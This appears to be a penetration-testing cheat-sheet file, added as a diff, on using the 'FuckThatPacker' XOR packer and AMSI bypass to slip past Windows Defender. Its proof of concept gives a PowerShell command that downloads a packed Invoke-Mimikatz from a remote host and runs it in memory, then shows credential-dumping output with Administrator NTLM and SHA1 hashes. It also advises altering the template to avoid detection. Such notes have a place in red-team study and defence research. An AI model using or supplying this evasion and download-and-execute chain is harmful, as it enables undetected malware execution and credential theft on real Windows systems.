@@ -1,0 +1,89 @@
+=========================================================================================================================================================
+AV bypass using the packer 'FuckThatPacker'
+=========================================================================================================================================================
+
+=> Source: https://github.com/Unknow101/FuckThatPacker
+
+It is a simple packer written in python that uses XOR encryption to pack/encrypt offensive PowerShell scripts in order to bypass the Windows Defender AV. 
+
+Features
+-----------
+> AMSI bypass
+> XOR encryption
+
+AV evasion
+-----------
+To be able to bypass the Windows Defender AV (and other AV solutions), it is important to customize the file 'template.txt' i.e.:
+> Modify/update the AMSI bypass one-liner
+> Change/obfuscate a bit the code
+
+
+=========================================================================================================================================================
+PoC - Download and execute into memory a packed/encrypted version of the script Invoke-Mimikatz.ps1 (custom version) on a Windows 10 laptop
+      without being detected nor blocked by the Windows Defender AV
+=========================================================================================================================================================
+
+
+Step 1 - Generate a packed/encrypted version of the script 'Invoke-mimkatz.ps1' with FuckThatPacker
+-----------------------------------------------------------------------------------------------------
+
+
+
+
+
+Step 2 - Download and execute into memory a packed/encrypted version of the script Invoke-Mimikatz without being detected by the Windows Defender AV
+-----------------------------------------------------------------------------------------------------------------------------------------------------
+
+C:\temp> Powershell -exec bypass
+
+PS C:\temp> 
+
+PS C:\temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 27/12/2022 23:16:16
+
+
+PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.30:8080/FTPacker-Invoke-Mimi-Custom.ps1');Invoke-Mimi-Custom
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 155328234 (00000000:09421eea)
+Session           : Interactive from 4
+User Name         : Administrator
+Domain            : Laptop1
+Logon Server      : Laptop1
+Logon Time        : 28/12/2022 01:00:38
+SID               : S-1-5-21-936125016-2310263949-2175806047-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : Laptop1
+         * NTLM     : 36f7a3ebaa54935ecf03678e<snip>
+         * SHA1     : d5feabcececab0e16c2cbb39<snip>
+        tspkg :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : <snip>
+        wdigest :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :       KO
+<SNIP>
